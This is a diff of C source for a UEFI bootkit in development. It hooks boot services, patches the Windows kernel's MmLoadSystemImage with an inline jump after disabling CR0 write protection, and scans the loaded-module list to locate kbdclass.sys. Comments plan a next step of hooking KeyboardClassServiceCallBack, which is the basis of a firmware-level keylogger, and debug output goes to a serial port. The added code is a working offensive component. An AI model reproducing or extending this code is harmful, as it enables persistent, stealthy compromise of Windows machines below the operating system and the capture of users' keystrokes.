@@ -28,6 +28,11 @@ EFI_EXIT_BOOT_SERVICES originalExitBootServices = NULL;
 UINT64 winloadReturnAddress = 0;
 VOID * kernelBase = 0;
 UINT64 g_OriginalMmAddress = 0;
+VOID* pCheckDriverCallback = NULL; 
+UINT64 g_KeyboardFound = 0; 
+LIST_ENTRY *g_PsLoadedModuleList = NULL;
+VOID* g_KbdBaseAddress = NULL; 
+VOID* g_KeyboardCallbackAddr = NULL;
 
 /********************************************************
  * Functions
@@ -37,10 +42,10 @@ UINT64 g_OriginalMmAddress = 0;
  * 1) Parse ntoskrnl PE to find any asset you want. (Write func for it)  done!
  * https://ferreirasc.github.io/PE-Export-Address-Table/
  * 
- * 2) Find MmLoadSystemImage hook it using r10. (inline asm, chat)
+ * 2) Find MmLoadSystemImage hook it using r10. (inline asm, chat)     done!
  * 
  * 3) Every time hook catch check PsLoadedModuleList -> Prase it. Find "kbdclass.sys".
- * https://gist.github.com/muturikaranja/b7d4b59c72611e76aed94b2f0bf33aa2
+ * https://gist.github.com/muturikaranja/b7d4b59c72611e76aed94b2f0bf33aa2      done! 
  * 
  * 4) Set hook on Kbdclass!KeyboardClassServiceCallBack -> msdn read
  * https://phrack.org/issues/69/15
@@ -71,6 +76,17 @@ VOID SerialWriteHex(UINT64 val)
     SerialWrite(buf);
 }
 
+//print for addresses in kernel
+VOID SerialWriteUnicode(UNICODE_STRING* uStr) {
+    if (!uStr || !uStr->Buffer) 
+        return;
+    for (UINT16 i = 0; i < uStr->Length / sizeof(CHAR16); i++) {
+        CHAR16 c = uStr->Buffer[i];
+        IoWrite8(COM1_PORT, (UINT8)(c & 0xFF)); 
+    }
+    IoWrite8(COM1_PORT, '\n');
+    IoWrite8(COM1_PORT, '\r');
+}
 
 VOID*
 FindPattern(
@@ -131,6 +147,71 @@ VOID* EFIAPI FindNtosExportByName(VOID *kernelBase , CHAR8* exportName)
     return NULL;
 }
 
+
+VOID EFIAPI CheckDriverCallback(UNICODE_STRING* DriverName)
+{
+    if (!DriverName || !DriverName->Buffer) return;
+    SerialWrite("Loading: ");
+    SerialWriteUnicode(DriverName);
+
+    CHAR16* name = DriverName->Buffer;
+    UINT16 len = DriverName->Length / 2;
+    
+    for (UINT16 i = 0; i < len - 7; i++) {
+        if ((name[i] == L'k' || name[i] == L'K') && 
+            (name[i+1] == L'b' || name[i+1] == L'B') && 
+            (name[i+2] == L'd' || name[i+2] == L'D')) {
+            
+            if (g_KeyboardFound == 0) {
+                SerialWrite("!!! Target Detected: kbdclass is loading, arming scanner... !!!\n\r");
+                g_KeyboardFound = 1; 
+            }
+            break;
+        }
+    }
+    if (g_KeyboardFound && g_PsLoadedModuleList) {
+        SerialWrite("\n\r--- Scanning PsLoadedModuleList ---\n\r");
+        
+        LIST_ENTRY *head = g_PsLoadedModuleList;
+        LIST_ENTRY *next = head->ForwardLink;
+        UINT32 count = 0;
+
+        while (next != head && count < 500) { 
+            PKLDR_DATA_TABLE_ENTRY pModule = CONTAINING_RECORD(next, KLDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
+            
+            if (pModule->BaseDllName.Buffer != NULL && pModule->BaseDllName.Length > 0 && pModule->BaseDllName.Length < 256) {
+                
+                SerialWrite("List item: ");
+                SerialWriteUnicode(&(pModule->BaseDllName));
+
+                CHAR16* bName = pModule->BaseDllName.Buffer;
+                
+                if ((bName[0] == L'k' || bName[0] == L'K') && 
+                    (bName[1] == L'b' || bName[1] == L'B') &&
+                    (bName[2] == L'd' || bName[2] == L'D')) {
+                    
+                    g_KbdBaseAddress = pModule->DllBase;
+                    
+                    SerialWrite("\n\r****************************************\n\r");
+                    SerialWrite(">>> SUCCESS! FOUND KBDCLASS BASE <<<\n\r");
+                    SerialWrite("Base Address: ");
+                    SerialWriteHex((UINT64)g_KbdBaseAddress);
+                    SerialWrite("****************************************\n\r\n\r");
+                    
+                    g_KeyboardFound = 0; 
+                    break;
+                }
+            }
+            next = next->ForwardLink;
+            count++;
+        }
+
+        if (g_KeyboardFound) {
+            SerialWrite("--- Scan complete. Target not in list yet. ---\n\r");
+        }
+    }
+}
+
 EFI_STATUS InstallPureAsmHook(VOID* TargetFunction)
 {
     if (!TargetFunction) return EFI_INVALID_PARAMETER;
@@ -139,28 +220,31 @@ EFI_STATUS InstallPureAsmHook(VOID* TargetFunction)
     UINT8* ptr = (UINT8*)TargetFunction;
     SerialWrite("Raw function bytes:\n");
     for (int i = 0; i < 24; i++) {
-
         SerialWriteHex(ptr[i]);
-
     }
 
     UINT8 HookPatch[13] = {
         0x49, 0xBA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov r10, HookEntry
         0x41, 0xFF, 0xE2                                            // jmp r10
     };
-
+    
     VOID* RuntimeHookAddress = (VOID*)HookEntry; 
-
     gRT->ConvertPointer(0, &RuntimeHookAddress); 
+    
     VOID* pOriginalAddr = (VOID*)&g_OriginalMmAddress;
     gRT->ConvertPointer(0, &pOriginalAddr);
 
+    pCheckDriverCallback = (VOID*)CheckDriverCallback;
+    gRT->ConvertPointer(0, &pCheckDriverCallback);
+    
+    VOID* pFlag = (VOID*)&g_KeyboardFound;
+    gRT->ConvertPointer(0, &pFlag);
+
     *(UINT64*)(HookPatch + 2) = (UINT64)RuntimeHookAddress;
+
     UINT64 cr0 = AsmReadCr0();
     AsmWriteCr0(cr0 & ~0x10000ULL);
-
     CopyMem(TargetFunction, HookPatch, 13);
-
     AsmWriteCr0(cr0);
 
     SerialWrite("Hook installed successfully with JMP r10\n");
@@ -197,8 +281,13 @@ VOID EFIAPI NotifySetVirtualAddressMap(EFI_EVENT Event, VOID* Context)
             SerialWrite("MmLoadSystemImage found, installing hook...\n");
             InstallPureAsmHook(mmLoadAddress);        
         }
-}
+    VOID* psListExport = FindNtosExportByName(kernelEntery->DllBase, "PsLoadedModuleList");
 
+    if (psListExport) {
+        g_PsLoadedModuleList = (LIST_ENTRY*)psListExport;
+        SerialWrite("PsLoadedModuleList found and initialized!\n\r");
+    }
+    }
 }
 
 EFI_STATUS EFIAPI HookedExitBootServices(EFI_HANDLE ImageHandle, UINTN MapKey)
@@ -221,23 +310,19 @@ VOID DebugCheckAddress(VOID* addr)
     UINTN DescriptorSize;
     UINT32 DescriptorVersion;
 
-    // שלב 1: קבלת גודל
     gBS->GetMemoryMap(&MapSize, MemoryMap, &MapKey, &DescriptorSize, &DescriptorVersion);
 
-    // שלב 2: הקצאת buffer
     MapSize += 0x1000;
     if (EFI_ERROR(gBS->AllocatePool(EfiBootServicesData, MapSize, (VOID**)&MemoryMap))) {
         Print(L"AllocatePool failed\n");
         return;
     }
 
-    // שלב 3: קבלת ה-map בפועל
     if (EFI_ERROR(gBS->GetMemoryMap(&MapSize, MemoryMap, &MapKey, &DescriptorSize, &DescriptorVersion))) {
         Print(L"GetMemoryMap failed\n");
         return;
     }
 
-    // שלב 4: חיפוש הכתובת
     EFI_MEMORY_DESCRIPTOR* desc = MemoryMap;
 
     for (UINTN i = 0; i < MapSize / DescriptorSize; i++) {
